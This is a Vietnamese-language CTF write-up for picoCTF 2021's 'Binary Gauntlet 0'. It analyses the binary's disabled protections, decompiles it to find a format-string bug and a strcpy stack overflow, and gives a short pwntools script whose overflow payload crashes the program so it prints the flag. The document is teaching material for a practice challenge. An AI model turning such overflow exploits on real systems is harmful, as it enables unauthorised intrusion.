# Binary Gauntlet 0

## Kiểm tra file
### file
```bash
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=a5c4ce8cddd5ece25b706af8d250134c3f70467c, not stripped
```
### checksec
```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```
- Định dạng ELF 64-bit
- Not stripped -> Ta có thể dễ dàng tìm được các hàm trong chương trình
- No Stack Canary, no NX, no PIE, has RWX segments -> Easy BOF
## Decompile & Disassemble
### Decompile `main`
```c
undefined8 main(void)
{
  char local_88 [108];
  __gid_t local_1c;
  FILE *local_18;
  char *local_10;
  
  local_10 = (char *)malloc(1000);
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0x0) {
    puts(
        "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are runningthis on the shell server."
        );
    exit(0);
  }
  fgets(flag,0x40,local_18);
  signal(0xb,sigsegv_handler);
  local_1c = getegid();
  setresgid(local_1c,local_1c,local_1c);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_88,local_10);
  return 0;
}
```
### Decompile `sigsegv_handler`
```C
void sigsegv_handler(void)
{
  fprintf(stderr,"%s\n",flag);
  fflush(stderr);               
  exit(1);
}
```
Hàm `sigsegv_handler` sẽ in ra flag. Khi hàm `signal` được gọi, nó sẽ thực thi `sigsegv_handler`. Vậy chỉ cần làm cho chương trình báo lỗi, ta sẽ có được flag.

Chương trình nhận vào 1 input rồi in input đó ra màn hình, sau đó nhận input thứ 2 rồi gọi hàm `strcpy`.
Có 2 lỗi ở hàm main:
1. `printf(local_10)` -> Lỗi chuỗi định dạng (Format String)
2. `strcpy(local_88, local_10)` -> `strcpy` không kiểm tra số lượng kí tự ở dest -> Tràn bộ đệm tại dest nếu không được cấp phát đủ vùng nhớ để chứa chuỗi src (Buffer Overflow)

Vậy bài này có 2 hướng khai thác, nhưng vì người viết chương trình đã tốt bụng tắt hết các cơ chế bảo vệ, chúng ta sẽ dùng cách gây tràn vùng nhớ biến local_88 vì nó được đặt trong stack, dễ dàng ghi đè return address và gây lỗi.
### Disassemble `main`
```asm
0x000000000040090d <+0>:	push   rbp
0x000000000040090e <+1>:	mov    rbp,rsp
0x0000000000400911 <+4>:	sub    rsp,0x90
0x0000000000400918 <+11>:	mov    DWORD PTR [rbp-0x84],edi
0x000000000040091e <+17>:	mov    QWORD PTR [rbp-0x90],rsi
0x0000000000400925 <+24>:	mov    edi,0x3e8
0x000000000040092a <+29>:	call   0x400790 <malloc@plt>
0x000000000040092f <+34>:	mov    QWORD PTR [rbp-0x8],rax
0x0000000000400933 <+38>:	lea    rsi,[rip+0x192]        # 0x400acc
0x000000000040093a <+45>:	lea    rdi,[rip+0x18d]        # 0x400ace
0x0000000000400941 <+52>:	call   0x4007c0 <fopen@plt>
0x0000000000400946 <+57>:	mov    QWORD PTR [rbp-0x10],rax
0x000000000040094a <+61>:	cmp    QWORD PTR [rbp-0x10],0x0
0x000000000040094f <+66>:	jne    0x400967 <main+90>
0x0000000000400951 <+68>:	lea    rdi,[rip+0x180]        # 0x400ad8
0x0000000000400958 <+75>:	call   0x400730 <puts@plt>
0x000000000040095d <+80>:	mov    edi,0x0
0x0000000000400962 <+85>:	call   0x4007d0 <exit@plt>
0x0000000000400967 <+90>:	mov    rax,QWORD PTR [rbp-0x10]
0x000000000040096b <+94>:	mov    rdx,rax
0x000000000040096e <+97>:	mov    esi,0x40
0x0000000000400973 <+102>:	lea    rdi,[rip+0x200766]        # 0x6010e0 <flag>
0x000000000040097a <+109>:	call   0x400760 <fgets@plt>
0x000000000040097f <+114>:	lea    rsi,[rip+0xffffffffffffff41]        # 0x4008c7 <sigsegv_handler>
0x0000000000400986 <+121>:	mov    edi,0xb
0x000000000040098b <+126>:	call   0x400770 <signal@plt>
0x0000000000400990 <+131>:	mov    eax,0x0
0x0000000000400995 <+136>:	call   0x4007b0 <getegid@plt>
0x000000000040099a <+141>:	mov    DWORD PTR [rbp-0x14],eax
0x000000000040099d <+144>:	mov    edx,DWORD PTR [rbp-0x14]
0x00000000004009a0 <+147>:	mov    ecx,DWORD PTR [rbp-0x14]
0x00000000004009a3 <+150>:	mov    eax,DWORD PTR [rbp-0x14]
0x00000000004009a6 <+153>:	mov    esi,ecx
0x00000000004009a8 <+155>:	mov    edi,eax
0x00000000004009aa <+157>:	mov    eax,0x0
0x00000000004009af <+162>:	call   0x400740 <setresgid@plt>
0x00000000004009b4 <+167>:	mov    rdx,QWORD PTR [rip+0x2006f5]        # 0x6010b0 <stdin@@GLIBC_2.2.5>
0x00000000004009bb <+174>:	mov    rax,QWORD PTR [rbp-0x8]
0x00000000004009bf <+178>:	mov    esi,0x3e8
0x00000000004009c4 <+183>:	mov    rdi,rax
0x00000000004009c7 <+186>:	call   0x400760 <fgets@plt>
0x00000000004009cc <+191>:	mov    rax,QWORD PTR [rbp-0x8]
0x00000000004009d0 <+195>:	add    rax,0x3e7
0x00000000004009d6 <+201>:	mov    BYTE PTR [rax],0x0
0x00000000004009d9 <+204>:	mov    rax,QWORD PTR [rbp-0x8]
0x00000000004009dd <+208>:	mov    rdi,rax
0x00000000004009e0 <+211>:	mov    eax,0x0
0x00000000004009e5 <+216>:	call   0x400750 <printf@plt>
0x00000000004009ea <+221>:	mov    rax,QWORD PTR [rip+0x2006af]        # 0x6010a0 <stdout@@GLIBC_2.2.5>
0x00000000004009f1 <+228>:	mov    rdi,rax
0x00000000004009f4 <+231>:	call   0x4007a0 <fflush@plt>
0x00000000004009f9 <+236>:	mov    rdx,QWORD PTR [rip+0x2006b0]        # 0x6010b0 <stdin@@GLIBC_2.2.5>
0x0000000000400a00 <+243>:	mov    rax,QWORD PTR [rbp-0x8]
0x0000000000400a04 <+247>:	mov    esi,0x3e8
0x0000000000400a09 <+252>:	mov    rdi,rax
0x0000000000400a0c <+255>:	call   0x400760 <fgets@plt>
0x0000000000400a11 <+260>:	mov    rax,QWORD PTR [rbp-0x8]
0x0000000000400a15 <+264>:	add    rax,0x3e7
0x0000000000400a1b <+270>:	mov    BYTE PTR [rax],0x0
0x0000000000400a1e <+273>:	mov    rdx,QWORD PTR [rbp-0x8]
0x0000000000400a22 <+277>:	lea    rax,[rbp-0x80]
0x0000000000400a26 <+281>:	mov    rsi,rdx
0x0000000000400a29 <+284>:	mov    rdi,rax
0x0000000000400a2c <+287>:	call   0x400720 <strcpy@plt>
0x0000000000400a31 <+292>:	mov    eax,0x0
0x0000000000400a36 <+297>:	leave  
0x0000000000400a37 <+298>:	ret    
```
Gọi hàm `strcpy`
```asm
0x0000000000400a1e <+273>:	mov    rdx,QWORD PTR [rbp-0x8]
0x0000000000400a22 <+277>:	lea    rax,[rbp-0x80]
0x0000000000400a26 <+281>:	mov    rsi,rdx
0x0000000000400a29 <+284>:	mov    rdi,rax
0x0000000000400a2c <+287>:	call   0x400720 <strcpy@plt>
```
Biến local_88 nằm ở [rbp - 0x80]. Chúng ta cần 0x90 bytes để ghi đè return address và gây `sigsegv`

## Exploit
### exploit.py
```python
from pwn import *

context.binary = ELF("./gauntlet")
run = remote("mercury.picoctf.net", 12294)

run.sendline("Pwned")
payload = 'A' * 0x90
run.sendline(payload)

run.interactive()
```
## Output
```bash
[*] '/home/revirven/Desktop/GitHub/CTF-Writeups/PicoCTF-2021/Binary-Exploitation/Binary-Gauntlet-0/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to mercury.picoctf.net on port 12294: Done
[*] Switching to interactive mode
Pwned
fbd01d62c0e369e6de3d63b4b21d3830

[*] Got EOF while reading in interactive
$ 
```
